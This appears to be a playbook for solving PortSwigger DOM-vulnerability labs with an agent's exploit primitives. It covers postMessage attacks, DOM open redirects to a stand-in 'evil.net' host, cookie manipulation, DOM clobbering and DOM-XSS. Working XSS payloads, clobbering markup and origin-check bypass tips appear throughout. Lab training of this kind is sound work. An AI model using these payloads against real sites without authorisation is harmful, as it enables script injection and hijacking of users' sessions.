# DOM-Based Vulnerabilities Methodology
## Expert-Level Playbook (web messages, open redirect, cookie, DOM clobbering)

> 7 PortSwigger labs (plus DOM-XSS overlaps). The bug lives entirely in
> client-side JavaScript: a **source** (attacker-controllable) flows into a
> **sink** (dangerous operation) without safe handling. Trace source→sink in the
> JS with the real browser, then deliver via the exploit server. For DOM-XSS
> payload contexts see `xss_advanced.md`.

---

## Phase 1: Source → Sink tracing

### 1.1 Sources (attacker-controllable)
```
location.href / .search / .hash / .pathname
document.URL / documentURI / referrer / cookie
window.name
postMessage (event.data)
localStorage / sessionStorage
```

### 1.2 Sinks (by impact class)
| Impact | Sinks |
|--------|-------|
| Script execution (DOM-XSS) | `eval`, `Function`, `setTimeout/Interval(str)`, `innerHTML`, `document.write`, `$()`, `$.parseHTML`, `element.setAttribute` |
| Open redirect | `location = `, `location.href/assign/replace`, `window.open` |
| Cookie manipulation | `document.cookie = ` |
| Link/DOM manipulation | `element.src/href`, `iframe.src` |
| WebSocket / fetch URL | `new WebSocket(url)`, `fetch(url)` |

### 1.3 Trace in the browser
```
extract_js_endpoints                 # pull JS bundles
browser_navigate url=...              # load the page
browser_execute_js code="/* set breakpoints / inspect handlers */"
```
Search bundles for a source name and follow it to a sink. Confirm the exact
context (HTML/attr/JS-string) at the sink to pick the payload.

---

## Phase 2: Attack techniques (per sub-variant)

### 2.1 Web messages (postMessage)
The page has `addEventListener('message', e => sink(e.data))` with a weak/absent
origin check. Deliver a cross-origin message after the iframe loads:
```
# exploit_primitives.postmessage_exploit(target, message, target_origin="*")
```
- If the handler does `element.innerHTML = e.data` → send `<img src=x onerror=...>`.
- If it does `location = e.data` → send a `javascript:` URL / open redirect.
- Bypass sloppy origin checks: `indexOf('target')` (put `target` in your host),
  `startsWith`, missing `event.origin` check entirely.
Sequencing: post the message on the iframe's `onload` (the primitive does this)
so the handler is registered first — never race it.

### 2.2 DOM open redirect
Source (e.g. `?returnUrl=` / `#`) flows into `location`/`window.open`.
```
# exploit_primitives.open_redirect_url(base, "returnUrl", "https://evil.net")
```
Escalate to DOM-XSS when the sink is `location` and `javascript:` URLs execute:
`?returnUrl=javascript:alert(document.domain)`.

### 2.3 DOM cookie manipulation
Source flows into `document.cookie = ...`. Inject a cookie value the page later
reflects into HTML (second-order DOM-XSS) or that changes app behavior. Deliver
by navigating the victim to the crafted URL:
```
# exploit_primitives.dom_cookie_manipulation_delivery(target_url_with_payload)
```

### 2.4 DOM clobbering
No JS injection allowed (HTML-only, e.g. sanitized markdown) but the page reads a
global like `window.x.y`. Inject named elements to *clobber* that global:
```
# exploit_primitives.dom_clobbering_form(js_name="defaultAvatar")
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
The clobbered property feeds a downstream sink (config/`innerHTML`) → XSS or
logic change. Also clobber `document.getElementById` returns via `id=`/`name=`.

### 2.5 Classic DOM-XSS (hash / query / jQuery selector)
```
# hash → innerHTML/document.write
https://TARGET/#<img src=x onerror=alert(document.domain)>
# jQuery $(location.hash) selector injection → deliver via iframe hash rewrite:
# exploit_primitives.dom_hashchange_delivery(target, js)
# jQuery attr('href', location.search.x) → javascript: URL (dom_jquery_href_payload)
```

---

## Phase 3: Sub-variant → primitive map

| PortSwigger sub-variant | Reynard primitive |
|-------------------------|-------------------|
| DOM XSS via web messages | `postmessage_exploit` |
| DOM XSS via `jQuery` selector / hashchange | `dom_hashchange_delivery`, `dom_jquery_selector_payload` |
| DOM XSS via `jQuery` `href` | `dom_jquery_href_payload` |
| DOM-based open redirect | `open_redirect_url` |
| DOM-based cookie manipulation | `dom_cookie_manipulation_delivery` |
| DOM clobbering | `dom_clobbering_form` |
| `innerHTML` / `document.write` sink | `dom_innerhtml_payload`, `dom_document_write_payload` |

---

## Phase 4: Tooling

```
extract_js_endpoints        # get JS bundles for source→sink tracing
browser_navigate / browser_execute_js / browser_interact   # prove execution in-DOM
exploit_server              # host delivery pages (postMessage/redirect/cookie/clobbering)
http_request                # fetch pages/JS for static analysis
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Reflection escaped in HTML | Try attribute/JS-string/URL/template contexts at the sink |
| Origin check on postMessage | Abuse `indexOf`/`startsWith`/missing-check weaknesses |
| No JS injection allowed | Use DOM clobbering to influence a read global |
| Payload reaches sink but no exec | Match payload to the exact sink type (innerHTML→`<img onerror>`, not `<script>`) |
| Can't observe | Use `browser_execute_js` to inspect runtime DOM/handlers |

## Validation / Success Criteria
- [ ] Payload reaches the sink through browser-side code (traced source→sink).
- [ ] The sink produces security impact (script exec / redirect / cookie / clobber), not just DOM mutation.
- [ ] A control value reaches the same path without the malicious effect.
- [ ] Lab solved banner or browser-observed execution confirmed.
